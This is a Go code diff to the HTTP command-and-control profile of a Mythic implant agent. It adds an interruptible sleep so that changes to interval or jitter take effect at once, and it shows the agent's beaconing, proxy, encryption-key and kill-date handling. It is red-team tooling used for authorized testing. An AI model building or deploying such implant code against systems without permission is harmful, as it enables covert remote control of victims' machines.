@@ -49,21 +49,22 @@ type HTTPInitialConfig struct {
 }
 
 type C2HTTP struct {
-	BaseURL        string            `json:"BaseURL"`
-	PostURI        string            `json:"PostURI"`
-	ProxyURL       string            `json:"ProxyURL"`
-	ProxyUser      string            `json:"ProxyUser"`
-	ProxyPass      string            `json:"ProxyPass"`
-	ProxyBypass    bool              `json:"ProxyBypass"`
-	Interval       int               `json:"Interval"`
-	Jitter         int               `json:"Jitter"`
-	HeaderList     map[string]string `json:"Headers"`
-	ExchangingKeys bool
-	Key            string `json:"EncryptionKey"`
-	RsaPrivateKey  *rsa.PrivateKey
-	Killdate       time.Time `json:"KillDate"`
-	ShouldStop     bool
-	stoppedChannel chan bool
+	BaseURL               string            `json:"BaseURL"`
+	PostURI               string            `json:"PostURI"`
+	ProxyURL              string            `json:"ProxyURL"`
+	ProxyUser             string            `json:"ProxyUser"`
+	ProxyPass             string            `json:"ProxyPass"`
+	ProxyBypass           bool              `json:"ProxyBypass"`
+	Interval              int               `json:"Interval"`
+	Jitter                int               `json:"Jitter"`
+	HeaderList            map[string]string `json:"Headers"`
+	ExchangingKeys        bool
+	Key                   string `json:"EncryptionKey"`
+	RsaPrivateKey         *rsa.PrivateKey
+	Killdate              time.Time `json:"KillDate"`
+	ShouldStop            bool
+	stoppedChannel        chan bool
+	interruptSleepChannel chan bool
 }
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
@@ -112,14 +113,15 @@ func init() {
 		os.Exit(1)
 	}
 	profile := C2HTTP{
-		BaseURL:        final_url,
-		PostURI:        initialConfig.PostURI,
-		ProxyUser:      initialConfig.ProxyUser,
-		ProxyPass:      initialConfig.ProxyPass,
-		Key:            initialConfig.AESPSK,
-		Killdate:       killDateTime,
-		ShouldStop:     true,
-		stoppedChannel: make(chan bool, 1),
+		BaseURL:               final_url,
+		PostURI:               initialConfig.PostURI,
+		ProxyUser:             initialConfig.ProxyUser,
+		ProxyPass:             initialConfig.ProxyPass,
+		Key:                   initialConfig.AESPSK,
+		Killdate:              killDateTime,
+		ShouldStop:            true,
+		stoppedChannel:        make(chan bool, 1),
+		interruptSleepChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
@@ -153,7 +155,13 @@ func init() {
 
 	RegisterAvailableC2Profile(&profile)
 }
-
+func (c *C2HTTP) Sleep() {
+	// wait for either sleep time duration or sleep interrupt
+	select {
+	case <-c.interruptSleepChannel:
+	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
+	}
+}
 func (c *C2HTTP) Start() {
 	// Checkin with Mythic via an egress channel
 	// only try to start if we're in a stopped state
@@ -188,7 +196,7 @@ func (c *C2HTTP) Start() {
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
 							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
-							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+							c.Sleep()
 							continue
 						}
 						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
@@ -196,7 +204,7 @@ func (c *C2HTTP) Start() {
 				} else {
 					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
 				}
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 			}
 		} else {
 			//fmt.Printf("Uh oh, failed to checkin\n")
@@ -232,11 +240,17 @@ func (c *C2HTTP) UpdateConfig(parameter string, value string) {
 		if err == nil {
 			c.Interval = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "Jitter":
 		newInt, err := strconv.Atoi(value)
 		if err == nil {
 			c.Jitter = newInt
 		}
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 	case "Killdate":
 		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
 		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
@@ -278,6 +292,9 @@ func (c *C2HTTP) GetSleepTime() int {
 func (c *C2HTTP) SetSleepInterval(interval int) string {
 	if interval >= 0 {
 		c.Interval = interval
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
 	} else {
 		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
@@ -288,6 +305,9 @@ func (c *C2HTTP) SetSleepInterval(interval int) string {
 func (c *C2HTTP) SetSleepJitter(jitter int) string {
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
+		go func() {
+			c.interruptSleepChannel <- true
+		}()
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
 	} else {
 		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
@@ -326,7 +346,7 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 		}
 		checkin := CreateCheckinMessage()
 		if raw, err := json.Marshal(checkin); err != nil {
-			time.Sleep(time.Duration(c.GetSleepTime()))
+			c.Sleep()
 			continue
 		} else {
 			resp := c.SendMessage(raw)
@@ -335,7 +355,7 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 			response := structs.CheckInMessageResponse{}
 			if err = json.Unmarshal(resp, &response); err != nil {
 				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 			if len(response.ID) != 0 {
@@ -343,7 +363,7 @@ func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 				SetAllEncryptionKeys(c.Key)
 				return response
 			} else {
-				time.Sleep(time.Duration(c.GetSleepTime()))
+				c.Sleep()
 				continue
 			}
 		}
@@ -482,7 +502,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if resp.StatusCode != 200 {
@@ -492,7 +512,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
 			}
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		body, err := io.ReadAll(resp.Body)
@@ -503,7 +523,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
 			}
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		err = resp.Body.Close()
@@ -515,13 +535,13 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(raw) < 36 {
 			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
 			IncrementFailedConnection(c.ProfileName())
-			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			c.Sleep()
 			continue
 		}
 		if len(c.Key) != 0 {
@@ -531,7 +551,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 				// failed somehow in decryption
 				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
 				IncrementFailedConnection(c.ProfileName())
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+				c.Sleep()
 				continue
 			} else {
 				if i > 0 {
